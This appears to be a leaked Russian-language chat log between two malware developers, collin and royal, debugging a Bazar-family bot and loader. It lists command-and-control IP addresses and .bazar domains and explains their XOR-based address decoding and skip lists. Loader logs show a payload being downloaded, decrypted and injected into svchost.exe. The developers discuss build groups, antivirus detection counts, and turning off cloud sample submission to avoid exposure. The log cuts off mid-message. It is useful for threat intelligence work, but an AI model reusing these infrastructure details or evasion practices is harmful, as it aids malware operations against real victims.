V7md#Bs7jTNb7kRN8kRb6d2V&Mf5j
https://privatlab.com/s/v/ydAnqG5ewwuE8Z9r4NGy
https://privatlab.com/s/d/ydAnqG5ewwuE8Z9r4NGy/376pw#delete
```
[14.02.22 08:21:28] collin:		вот логи прогонов
[14.02.22 08:21:39] collin:		доступ для теста на машину может дать odis
[14.02.22 08:21:51] collin:		проблема появилась недавно судя по всему, т.к. он говорит твоя сборка неделю назад на семерке норм стучала
[14.02.22 08:22:30] collin:		надо разобраться в ситуации
[14.02.22 08:25:47] collin:		добавил в редмайн таски по обоим ситуациям - 867 и 868 в самую первую очередь ими займись
[14.02.22 08:25:52] royal:		Там по логам адреса не работают.
[14.02.22 08:26:11] royal:		404, 12029 ошибки в запросах.
[14.02.22 08:26:50] collin:		ну не может такого быть он два прогона делал каждый раз когда лоадер ошибка, бот проходит
[14.02.22 08:27:17] royal:		Так у них разные адреса.
[14.02.22 08:27:20] collin:		404 - сервер ответил значит, криптография барахлит
[14.02.22 08:27:24] royal:		У ботп и лоадера.
[14.02.22 08:27:46] royal:		А на win 10 работает.
[14.02.22 08:27:53] royal:		Значит не брахлит.
[14.02.22 08:28:02] collin:		на вин10 11 19 работает норм
[14.02.22 08:28:37] collin:		и адреса там одинаковый набор для бота и лоадера были, группа 16 пятничная
[14.02.22 08:29:21] collin:		ответ 404, что-то с криптографией что на 7 она не робит
[14.02.22 08:29:37] collin:		или в целом с сетевыми api
[14.02.22 08:32:08] collin:		`2/13/2022 10:58:13 PM whitestorm9p.bazar -> https://186.73.40.224:443`
[14.02.22 08:32:18] collin:		у тебя неправильно резолвиться из базара адрес
[14.02.22 08:32:59] collin:		там запись "26.85.198.164" - делаем xor 254 по каждому октету - получаем `228.171.56.90` - адрес в скип-листе для сквоттинга - пропускаем попытки коннекта не делаем
[14.02.22 08:33:05] collin:		откуда 186.73.40.224 ?
[14.02.22 08:34:46] collin:		`piynxyek.bazar -> https://45.41.204.147:443` в третьем шаге в норм, а во втором откудато другой алгоритм..
[14.02.22 08:37:51] royal:		Один и тот же алгоритм. Одна функция резолвит на 2 и на 3 шаге.
[14.02.22 08:40:23] collin:		таск 869 добавил
[14.02.22 08:47:17] collin:		-----BEGIN PGP MESSAGE-----

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
iZ5N2sIYBO8EBYFDoth5vfNlCoSwcQ==
=GM4K
-----END PGP MESSAGE-----
[14.02.22 08:47:22] collin:		машина для проверки по таску 867
[14.02.22 08:47:30] collin:		обрати внимание чтобы там облако и отправка образцов были вырублены
[14.02.22 09:04:36] royal:		На Win 7 не работает функция HttpAddRequestHeaders
[14.02.22 09:04:46] royal:		Так же как она работает на win 10.
[14.02.22 09:04:53] royal:		Вот в чем проблема.
[14.02.22 09:05:22] royal:		По этому 404, заголовки такие.
[14.02.22 09:05:38] royal:		Просто откатываю последний коммит и все.
[14.02.22 09:31:09] collin:		а раньше как было?
[14.02.22 09:31:31] collin:		`Minimum supported client 	Windows 2000 Professional [desktop apps only]` - должна работать..
[14.02.22 09:32:27] collin:		там есть два варианта A/W может здесь не та выбираться стала
[14.02.22 09:39:23] royal:		Я думаю там надо всегда в конце добавлять \r\n, даже если заголовок 1.
[14.02.22 09:39:43] royal:		В win 7 например в блокнот не понимает \n, только \r\n.
[14.02.22 11:32:28] royal:		Напомни сайт где можно bazar искать?
[14.02.22 11:32:56] royal:		Типа пишешь tralala.bazar и он показывает его и адрес.
[14.02.22 11:33:02] royal:		Помню такой есть.
[14.02.22 11:48:17] collin:		`https://explorer.emercoin.com/nvs/dns`
[15.02.22 07:21:40] collin:		привет!
[15.02.22 07:22:12] collin:		пришли свой tox-id в pgp
[15.02.22 07:56:06] royal:		Привет.
[15.02.22 07:56:06] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAmZDjemY2NcItbs3Yh5ktjBiRobFT/kxO2nATwhAALdAA
mAHR2HFKZVVNSPPRIfo7WdyA52IDVGONbglaonWLxmw7xYu15yVRcivQzkdOojRr
+oyfP4KnLrVlyPJN9CnP8ZEvAE0+Hgu2XJiRNyfxCWwraWGk89EMNNSu0BotMFuf
FYjCqyGQ46yUC7RG0xh4QtQPE4hxDRUwMtI73lmN0IrQl7DKDM/g3itu7aTPjA91
XRK35Hlu2wQj0RCgzvLqc8WXz8+yL/2pSgwYntetIYoBI4fOgcs2DCVJuGINpjws
Sj6Slbk50vDU90w32hra1CRHzUOzF7c1oFWyUf9b5g/9DQ6Ie9L4yFA3CsQP3LTB
sWIue43q03OyagI56l8DscqIamM8jg93UBAsqKELBvhVn19TLN6jxURuhC4bQGr0
IZ3ikRc9prrYo2Ll+vc+l28qLl+q1haZ5DnsxHxJAQnFcqYCryfoN+PAZ27EoYdg
7BEuDVrM/skRErgafml2zDLGv630i5QLsqAMGbQFPG9n28c3ODU1TpOv3VsYYbpq
JnzLOHUsrjEQeNUIAlykeCcp5wavdBfLl96jkCWyHO3TOifEfY4ImA2qmwK4A59l
RPkmrP+II1sYPuibHT9FgElHF+kcuAE+6s4tpIJz4RN925K94irT+Ypn9nDer7HS
egHPhUNOyFy8SlMD/u9ZzcLqGiVCcLzoVc/X4M+V8+wBFOBRrSnUwD5KaVdlFIS6
NaJKURdJHlANrbSc0qjCA0PQFK0F13O8+1zqQ8YLMCHn3q6oMPzLJRqGe3iwn0VG
//Jqi2Dh7CZUUy6X1cbiwwhOrFS57KOKZAJA
=K7Eq
-----END PGP MESSAGE-----
[15.02.22 07:57:09] collin:		+
[15.02.22 08:18:54] collin:		сделай сборки:
[15.02.22 08:18:58] collin:		группа 16 generic
группа 16 rundll32(vicsnet)
[15.02.22 08:19:11] collin:		```
адреса (домены) первого этапа
бот:
185.150.117.116
172.96.188.72
45.131.66.226
23.160.193.137

лоадер:
45.131.66.226
23.160.193.137
185.150.117.116
172.96.188.72

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[15.02.22 08:19:14] collin:		направь odis
[15.02.22 09:29:03] collin:		`группа 16 rundll32(vicsnet)` - вот эту мне продублируй сборку
[15.02.22 09:42:42] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ//ZaTHi6gVPIwhMK9OmBaXR2FoXt/hvni1u/gJFt8fDJxb
km17P/YIyyLke1arWdylaO7wOWpdz1pXamwLXieQZqLjTGr9sSR6AyYM+c2KvEM1
gbNGjHsx5NTSxvlSyX+uIVjMlxKbmKnwm/0BCu9aRxlrSdwsJq8+XQOVSNS2kERT
Tm+e2vS5HeWrv43jMXxV8LnrPb9OX9cvNfxg0qbKGhyvVDzIi0egq1Y8o8uxBVWV
Pv7NOYBRMV5H7I0r/gPhuRJYppBfaaGaVbKXA/ChzOiy72uvJ0+mC5j4TYSfJycX
HdMTBm12QWrgmyR7gVAdFZboB2NtGXainUlpRKP+IMn8vCBowrYfSZslvEuKBhCp
REhUXBjdQzSeev2+qEZ29HRmO2QFvQi6UcAjXI9lp/gEYTA/QVkkdBABaRUt8tG1
OgFpOaLmdi2dXgUOaj5ix9Ah9iSR1NdYccalmqUb0vbFgYGmf1Yj3/4qRj88gVfM
YPx7SjwaSg6yZ6twSo2XrN/OC93I46fwub6QwHY0pzrmMG6nOp77QzsRZK/jTODu
NUFmwV7AnAbf66Kd5BI2o14FC1BF6VQEPfNvRXa0pK4hswiexhdf4Dnt9ABELhRc
lq1IoQiUVaRljuvUnuFMKnkosP6OaPf4tMDB+viV3mkHZNKj8GSwcBHnt4z/WXjS
wDoB7Zp474vmx9AgmIfPjePY2uMGmnVF5nOvX1hytBXxuxx4iSDeVLt+D7okDPma
TBzpCN8bQFuWswN7NOziQL5y/lgcYUGy7twfwOFwEzN27TZc1oaP+xA8kJUOnEMj
AqoHREldNHXWURdvzJnWO6z0uhqhUU4xXxT4Swvig3OL7y8ISzj5UchApIOi2h5v
gvNfHvdn6iB/EUy+A4khIOnFCsW24W2lYg44NMIApeYqarwWbiwL0XSBCVTQvAUc
eThRRBiPw2Ax9eoRTvsG58Gt34ecwQK2Ok9bjeW9uGUrRm675cAmnPFYoqL2wmUe
E8o1y6Zz5OOX5hKi
=BAHJ
-----END PGP MESSAGE-----
[15.02.22 09:42:46] royal:		2 детекта.
[15.02.22 09:43:05] royal:		По поводу резолва, это косяк opennic и их серверов.
[15.02.22 09:43:25] royal:		В командной строке такие же адреса получаются.
[15.02.22 09:43:33] collin:		точка входа vicsnet ?
[15.02.22 09:43:48] royal:		Да.
[15.02.22 09:52:13] royal:		odis когда будет?
[15.02.22 09:53:23] collin:		не отпрашивался вроде бы
[15.02.22 09:53:33] collin:		подождем еще час
[15.02.22 10:34:25] collin:		odis пришел
[15.02.22 12:05:20] collin:		насчет таска 867 а ты сам проверил на машине которую я дал?
[15.02.22 12:24:26] collin:		ошибка та же самая, и падает на той же позицииъ
[15.02.22 12:24:34] collin:		```
2/15/2022 4:21:26 AM Getting motherboard info
```
[15.02.22 12:24:50] royal:		Я ее не проверял на той машине еще.
[15.02.22 12:25:15] collin:		а как ты исправил?
[15.02.22 12:25:24] royal:		Я не исправил.
[15.02.22 12:25:26] collin:		проблема тут специфичная для машины
[15.02.22 12:25:32] collin:		ты поставил статус Тестирование в таске
[15.02.22 12:25:41] collin:		зачем тогда
[15.02.22 12:26:10] royal:		А что не тестирование?
[15.02.22 12:27:01] collin:		статус Тестирование подразумевает что таск выполнен и тобой проверен
[15.02.22 12:27:24] collin:		```
Cn6kf&Nd5nD@Bd8kf^Bda6jRb
https://privatlab.com/s/v/DBYb28OrybSWxAEknaMX
https://privatlab.com/s/d/DBYb28OrybSWxAEknaMX/e3x9z#delete
```
[15.02.22 12:27:35] collin:		лог последнего запуска
[15.02.22 12:29:35] royal:		Принял.
[15.02.22 15:10:20] royal:		В тестовой админке у команды "System info" в списке "Info type" нету флага debug.
[15.02.22 15:10:32] royal:		8192 - "debug info"
[15.02.22 15:19:35] collin:		есть, но виден только для СА
[15.02.22 15:21:59] royal:		Дай команду тогда боту 1a25650db9674df5125d8a536245d2b4 с флагом этим.
[15.02.22 15:26:36] collin:		поставил
[15.02.22 15:27:05] collin:		там еще не доделано походу, должна быть в группе настройка "флаги по умолчанию" и они должны проставляться в команду при выборе
[15.02.22 15:28:00] royal:		Работает.
[16.02.22 10:13:01] royal:		Привет. Дай доступ к машине где падает мой бот.
[16.02.22 10:15:12] collin:		привет!
[16.02.22 10:15:13] collin:		-----BEGIN PGP MESSAGE-----

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
lUYUT2X/djEarsJsQLfBNhI/diLPEQ==
=rGpm
-----END PGP MESSAGE-----
[16.02.22 13:54:46] royal:		Отошел.
[18.02.22 08:05:13] collin:		привет!
[18.02.22 08:05:19] collin:		есть успехи по 867 таску?
[18.02.22 08:24:19] royal:		Зделано все.
[18.02.22 08:24:25] royal:		Это был баг системы.
[18.02.22 08:26:13] royal:		Там нету информациио материнской плате на этой виртуалке и если брать ее (информацию) с помощью WMI прогорамма упадет при том что все возвращаемые значения у функций будут как SUCCESS.
[18.02.22 08:26:49] royal:		Беру информацию из реестра теперь, так не падает.
[18.02.22 08:27:05] collin:		то есть как отрабатывает а потом падает?
[18.02.22 08:27:19] collin:		или значение возвращает пустое/левый указатель на данные
[18.02.22 08:29:26] royal:		Я думаю так как нету этой информации, а запрос WMI выполняется как удачный, то получается в результате этого запроса получаются указатели в никуда, и на методе перебора результатов запроса next все падает.
[18.02.22 08:29:58] royal:		Я думаю это баг в системе такой.
[18.02.22 08:30:18] collin:		а проверку там нельзя вставить типа if(!pointer)...
[18.02.22 08:30:56] royal:		Проверка проходит.
[18.02.22 08:31:00] collin:		а в реестре данные нормальные, те же самые значения через WMI?
[18.02.22 08:31:11] royal:		Ин а указатели и на возвращаемое значение.
[18.02.22 08:31:26] royal:		В реестре просто получаешь пустое значение и все.
[18.02.22 08:31:33] royal:		Без падений.
[18.02.22 08:31:41] collin:		ок
[18.02.22 08:31:43] collin:		сделай тогда сборку
[18.02.22 08:31:45] royal:		IEnumWbemClassObject* wbemEnum = NULL;
	WCHAR queryLang[4];
	lstrcpyW(queryLang, _WCS(L"WQL"));
	WCHAR query[30];
	lstrcpyW(query, _WCS(L"SELECT * FROM Win32_BaseBoard"));
	coRes = services->ExecQuery((BSTR)queryLang, (BSTR)query, WBEM_FLAG_FORWARD_ONLY, NULL,
		&wbemEnum);
	if (SUCCEEDED(coRes))
	{
		//Manufacturer, Product, Version
		ULONG wbemCount = 0;
		IWbemClassObject* wbem = NULL;
		HRESULT enumRes = wbemEnum->Next(WBEM_INFINITE, 1, &wbem, &wbemCount);
[18.02.22 08:32:01] royal:		HRESULT enumRes = wbemEnum->Next(WBEM_INFINITE, 1, &wbem, &wbemCount);
Тут падает.
[18.02.22 08:33:08] collin:		группу 40 rundll32(scrcheck)
[18.02.22 08:33:17] collin:		```
адреса (домены) первого этапа
бот:
185.219.220.123
185.158.248.240
194.76.224.142
185.158.249.150

лоадер:
194.76.224.142
185.158.248.240
185.219.220.123
185.158.249.150

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[18.02.22 08:33:24] collin:		направь мне
[18.02.22 09:05:23] royal:		dyncheck не работает.
[18.02.22 09:05:42] royal:		Проверить не могу. Но думаю 2 детекта будет.
[18.02.22 09:05:49] collin:		не работает
[18.02.22 09:05:54] collin:		давай как есть
[18.02.22 09:10:02] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAg7S+Gg2pGKvEiTSS/cHakf6pAfda/mWdoAtDJrIF6QuF
f+dZ3z9ARaDzvKF+2IFjGzTUnBLtLC4+AjWx6bww+ydB2zNGd8NyZXUxkD4zp84b
0sEZcuRR13O3+JZCZhZ6i6yB6b9Ymxt7/MrDRGe1ljouED4ptZeqwO4GP0y3lUXR
dJ94/NS6iPaPVup7uGfhm7d3ewSorbinNsTa+hatC+swuRglvBvrc+DTRKFuPX8X
4ewN6KD1HYAcCA2RyOjdnhhIVbe6yDx8s5J7zGxq2UXbmQxrjg6Bz+nanRXBROiu
N6/RnwCFLSsCVZubVQ8k0fReFqfIvDWiL6+AH7RTmJdzy/TyssvP9PdnDISBIQs/
AAtYkGsGzVAPZu/0dLFKnVy138UNCqB0xKC+QwMD76j0cQS7/ds7xm05qe6Dxc79
/K/+DKguJMJELjwKmC1EaYs5Dnl8LUCfcgsVs+Mkd9MOzfRxi38mMGFU+Irsrx7Y
WBwDtbDFJ6cLWGvVc+xT3iaJgKdfXr3DVNvSA4vv8wOjlqw5tMluCtacpqRLKj+E
hNjgY3FN3qOhKDheJxkZXesJIn1IKZOTFDMAFVxCedBVWqn4anMHUdWK8s9uQ0Sz
8xxV3nR+GM+KX9OLJnmyTfSuuTRmmsHszhHWhsL9ShEgARqddpP1bEGzxQ1h4M/S
wCABWZy1XJ8+aHN7nhiwqdbBxyFS0EZ4kVqU0IYnt3uG3m6vVQkFIw7f8XwO0vE6
mAIkABYnAYDtd0XDoPiZSW0KaUupk94087lN/9stPB8E+cRZLpG9ST/O5HADofhf
5AaXwDrEYpNSfEyfoiA1dKuQmJUtVeCd3S0Dyumyd7DMBMBoRkonerxLxeXJEjmm
da4mXYe1TCzViIdgep+3NTSm3PuWZquDnG2W+vvbfe/L7lpPKd1ij0q6o40C2L9h
uHhnEMR77j4Y1CuEFAe6/84BwjCea0FH7JG0aMDJYlS/Fw==
=+oli
-----END PGP MESSAGE-----
[18.02.22 09:35:32] collin:		+
[18.02.22 12:52:22] collin:		что у тебя происходит в лоадере при коннекте на 3 шаге стратегии поиска
[18.02.22 12:52:26] collin:		```
2/18/2022 4:40:31 AM piynxyek.bazar -> https://45.41.204.147:443
2/18/2022 4:40:31 AM Connecting to https://45.41.204.147:443
2/18/2022 4:40:31 AM Connected to https://45.41.204.147:443
2/18/2022 4:40:31 AM Openning GET request to /net/client/request
2/18/2022 4:40:31 AM Creating cookie headers
2/18/2022 4:40:31 AM Creating additional headers
2/18/2022 4:40:31 AM Sending request
2/18/2022 4:40:34 AM Response code is 200
2/18/2022 4:40:34 AM Reading file from inet to buffer
2/18/2022 4:40:36 AM Readed 455936 bytes
2/18/2022 4:40:36 AM Decrypting file
```
[18.02.22 12:52:42] collin:		коннект установлен, файл получен и расшифрован судя по логу, но:
[18.02.22 12:52:57] collin:		```
2/18/2022 4:40:37 AM Connecting to piynxyek.bazar
2/18/2022 4:40:37 AM Sleep 43229 msecs
2/18/2022 4:41:20 AM Connecting to piynxyek.bazar
2/18/2022 4:41:20 AM Sleep 38367 msecs
```
[18.02.22 12:53:08] collin:		что еще за коннекты, что значит коннект к базару, базар-имена только для резолва
[18.02.22 12:54:00] collin:		затем еще раз коннектимся, получаем и расшифровывыаем файл, и только тогда начинаем запускать:
[18.02.22 12:54:08] collin:		```
2/18/2022 4:44:03 AM Connecting to https://45.41.204.147:443
2/18/2022 4:44:03 AM Connected to https://45.41.204.147:443
2/18/2022 4:44:03 AM Openning GET request to /net/client/request
2/18/2022 4:44:03 AM Creating cookie headers
2/18/2022 4:44:03 AM Creating additional headers
2/18/2022 4:44:03 AM Sending request
2/18/2022 4:44:05 AM Response code is 200
2/18/2022 4:44:05 AM Reading file from inet to buffer
2/18/2022 4:44:06 AM Readed 455936 bytes
2/18/2022 4:44:06 AM Decrypting file
2/18/2022 4:44:07 AM Creating target process with command line C:\Windows\system32\svchost.exe -k UnistackSvcGroup
```
[18.02.22 12:54:32] collin:		т.е. 3 с половиной минуты еще простой и повторное скачивание, почему так?
[18.02.22 12:54:55] royal:		Значит пропустил.
[18.02.22 12:55:53] royal:		Если бы не пропустил, написал бы что не может резолвить такой то базар.
[18.02.22 12:56:23] collin:		зачем пропускает?
[18.02.22 12:56:39] collin:		если файл скачан - надо его запускать, ну может пауза для шума
[18.02.22 12:56:44] collin:		а тут повторное скачивание = палево
[18.02.22 13:02:09] royal:		А там случайно два одновременно не работают загрузчика?
[18.02.22 13:03:09] royal:		Две разные версии могут работать одновременно.
[18.02.22 13:03:34] royal:		Вернее два загрузчика: которые были собраны в разные дни.
[18.02.22 13:05:32] collin:		такого не должно быть
[18.02.22 13:05:36] collin:		контроль запуска второй версии
[18.02.22 13:05:44] collin:		869 - ты проверял что исправлено?
[18.02.22 13:06:13] collin:		```
По состоянию на 18.02.2022 проблема актуальна, из лога запуска лоадера:
2/18/2022 4:39:17 AM Resolving reddew28c.bazar address
2/18/2022 4:39:17 AM reddew28c.bazar -> https://186.73.40.224:443

2/18/2022 4:39:42 AM Resolving bluehail.bazar address
2/18/2022 4:39:42 AM bluehail.bazar -> https://186.73.40.224:443

2/18/2022 4:40:07 AM Resolving whitestorm9p.bazar address
2/18/2022 4:40:07 AM whitestorm9p.bazar -> https://186.73.40.224:443

В соответствии с записями EmerDNS адреса такие:
bluehail.bazar запись "A=9.241.189.20" - адрес 247.15.67.234
whitestorm9p.bazar запись "A=26.85.198.164" - адрес 228.171.56.90
reddew28c.bazar запись "A=129.246.14.238" - адрес 127.8.240.16
Все 3 адреса в скип-листе, из-за неправильной работы алгоритма по данным адресам делаются попытки коннекта, что повышает палевность.
```
[18.02.22 13:06:17] collin:		это по 869, дописал в таск
[18.02.22 13:06:32] collin:		`Две разные версии могут работать одновременно.` - в любом случае один работает, перепроверил
[18.02.22 13:07:39] royal:		Да вижу, что то цикл не завершился.
[18.02.22 13:08:19] royal:		869 сам сделай nslookup в командной строке.
[18.02.22 13:08:42] collin:		```
Адрес 186.73.40.224 фигурирует в еще более поздних записях лога, когда идет попытка соединения уже на 3 шаге стратегии поиска:
2/18/2022 4:41:58 AM Connecting to https://186.73.40.224:443
2/18/2022 4:41:58 AM Connected to https://186.73.40.224:443

2/18/2022 4:43:08 AM Connecting to https://186.73.40.224:443
2/18/2022 4:43:08 AM Connected to https://186.73.40.224:443
Откуда он берется, непонятно.
```
[18.02.22 13:08:51] royal:		И увидишь что opennic вернет.
[18.02.22 13:09:58] royal:		opennic так резолвит на своих dns адресах.
[18.02.22 13:11:45] royal:		По поводу цикла нашел опечатку. Из за нее он не завершается.
[18.02.22 13:17:35] collin:		чота какая то хрень непонятнос базарами, сайт одни данные показывает а opennic-серверы другое..
[18.02.22 13:17:57] collin:		но с 3 шагам то норм вроде
[18.02.22 13:18:21] collin:		уберу короче домены 2 шага, они давно висят там может в банлистах какихто
[18.02.22 13:20:06] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/+Mdt9a6DsniQO/B/TB3uAquI4yE4oBJnHqwhSkLrWWGj8
VMlMokvIB7ySD+d/Hljw7krA19FV8eAWGz7bLUI6RYNZYw7sNrpdIWpGNV0bXCtU
DhXdF89UAIhwTjrD9r3TZ2BtYKpomlUoNsJPt9uAXxz+Wi3N4c/wS6/PvheOYMu2
A0psMe4gdpwHaXT8NwagiAzu+5WdkMWv6P37sLaavuo+IvrN1LdcSVsIiHwj0zr3
